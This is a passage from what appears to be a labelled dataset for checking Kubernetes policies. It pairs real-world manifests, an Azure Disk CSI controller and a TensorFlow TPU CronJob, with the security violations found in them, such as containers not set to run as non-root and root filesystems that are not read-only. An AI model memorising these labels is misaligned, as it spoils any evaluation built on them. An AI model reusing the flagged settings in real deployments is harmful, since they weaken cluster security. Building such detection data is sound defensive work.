- --v=2\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        - -feature-gates=RecoverVolumeExpansionFailure=true\n        - -timeout=240s\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29602\n        - --v=2\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: azuredisk\n        image: mcr.microsoft.com/k8s/csi/azuredisk-csi:v1.14.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29604\n        - --user-agent-suffix=OSS-kubectl\n        - --disable-avset-nodes=false\n        - --allow-empty-cloud-config=false\n        ports:\n        - containerPort: 29602\n          name: healthz\n          protocol: TCP\n        - containerPort: 29604\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-provisioner\" is not set to runAsNonRoot"
  },
  {
    "id": "01152",
    "manifest_path": "data/manifests/the_stack_sample/sample_0307.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-azuredisk-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-azuredisk-controller\n  template:\n    metadata:\n      labels:\n        app: csi-azuredisk-controller\n    spec:\n      serviceAccountName: csi-azuredisk-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - --feature-gates=Topology=true\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --timeout=15s\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --worker-threads=40\n        - --extra-create-metadata=true\n        - --strict-topology=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-attacher\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-attacher:v3.4.0\n        args:\n        - -v=2\n        - -csi-address=$(ADDRESS)\n        - -timeout=600s\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -worker-threads=500\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-snapshotter\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-snapshotter:v5.0.1\n        args:\n        - -csi-address=$(ADDRESS)\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        - -feature-gates=RecoverVolumeExpansionFailure=true\n        - -timeout=240s\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29602\n        - --v=2\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: azuredisk\n        image: mcr.microsoft.com/k8s/csi/azuredisk-csi:v1.14.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29604\n        - --user-agent-suffix=OSS-kubectl\n        - --disable-avset-nodes=false\n        - --allow-empty-cloud-config=false\n        ports:\n        - containerPort: 29602\n          name: healthz\n          protocol: TCP\n        - containerPort: 29604\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-resizer\" is not set to runAsNonRoot"
  },
  {
    "id": "01153",
    "manifest_path": "data/manifests/the_stack_sample/sample_0307.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-azuredisk-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-azuredisk-controller\n  template:\n    metadata:\n      labels:\n        app: csi-azuredisk-controller\n    spec:\n      serviceAccountName: csi-azuredisk-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - --feature-gates=Topology=true\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --timeout=15s\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --worker-threads=40\n        - --extra-create-metadata=true\n        - --strict-topology=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-attacher\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-attacher:v3.4.0\n        args:\n        - -v=2\n        - -csi-address=$(ADDRESS)\n        - -timeout=600s\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -worker-threads=500\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-snapshotter\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-snapshotter:v5.0.1\n        args:\n        - -csi-address=$(ADDRESS)\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        - -feature-gates=RecoverVolumeExpansionFailure=true\n        - -timeout=240s\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29602\n        - --v=2\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: azuredisk\n        image: mcr.microsoft.com/k8s/csi/azuredisk-csi:v1.14.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29604\n        - --user-agent-suffix=OSS-kubectl\n        - --disable-avset-nodes=false\n        - --allow-empty-cloud-config=false\n        ports:\n        - containerPort: 29602\n          name: healthz\n          protocol: TCP\n        - containerPort: 29604\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-snapshotter\" is not set to runAsNonRoot"
  },
  {
    "id": "01154",
    "manifest_path": "data/manifests/the_stack_sample/sample_0307.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-azuredisk-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-azuredisk-controller\n  template:\n    metadata:\n      labels:\n        app: csi-azuredisk-controller\n    spec:\n      serviceAccountName: csi-azuredisk-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - --feature-gates=Topology=true\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --timeout=15s\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --worker-threads=40\n        - --extra-create-metadata=true\n        - --strict-topology=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-attacher\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-attacher:v3.4.0\n        args:\n        - -v=2\n        - -csi-address=$(ADDRESS)\n        - -timeout=600s\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -worker-threads=500\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-snapshotter\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-snapshotter:v5.0.1\n        args:\n        - -csi-address=$(ADDRESS)\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        - -feature-gates=RecoverVolumeExpansionFailure=true\n        - -timeout=240s\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29602\n        - --v=2\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: azuredisk\n        image: mcr.microsoft.com/k8s/csi/azuredisk-csi:v1.14.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29604\n        - --user-agent-suffix=OSS-kubectl\n        - --disable-avset-nodes=false\n        - --allow-empty-cloud-config=false\n        ports:\n        - containerPort: 29602\n          name: healthz\n          protocol: TCP\n        - containerPort: 29604\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"liveness-probe\" is not set to runAsNonRoot"
  },
  {
    "id": "01155",
    "manifest_path": "data/manifests/the_stack_sample/sample_0309.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-retinanet-func-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"predict\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n\\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\"\\\n            :\\n    \\\"path\\\": \\\"$(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\\n            \\n    \\\"prefix\\\": \\\"resnet50/\\\"\\n  \\\"total_steps\\\": 1000\\n  \\\"train_file_pattern\\\"\\\n            : \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --strategy_type=tpu\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/retinanet/func/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/retinanet/func/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-retinanet-func-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"monitor\" does not have a read-only root file system"
  },
  {
    "id": "01156",
    "manifest_path": "data/manifests/the_stack_sample/sample_0309.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-retinanet-func-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"predict\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n\\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\"\\\n            :\\n    \\\"path\\\": \\\"$(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\\n            \\n    \\\"prefix\\\": \\\"resnet50/\\\"\\n  \\\"total_steps\\\": 1000\\n  \\\"train_file_pattern\\\"\\\n            : \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --strategy_type=tpu\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/retinanet/func/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/retinanet/func/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-retinanet-func-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"publisher\" does not have a read-only root file system"
  },
  {
    "id": "01157",
    "manifest_path": "data/manifests/the_stack_sample/sample_0309.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-retinanet-func-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"predict\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n\\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\"\\\n            :\\n    \\\"path\\\": \\\"$(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\\n            \\n    \\\"prefix\\\": \\\"resnet50/\\\"\\n  \\\"total_steps\\\": 1000\\n  \\\"train_file_pattern\\\"\\\n            : \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --strategy_type=tpu\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/retinanet/func/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/retinanet/func/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-retinanet-func-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"train\" does not have a read-only root file system"
  },
  {
    "id": "01158",
    "manifest_path": "data/manifests/the_stack_sample/sample_0309.yaml",
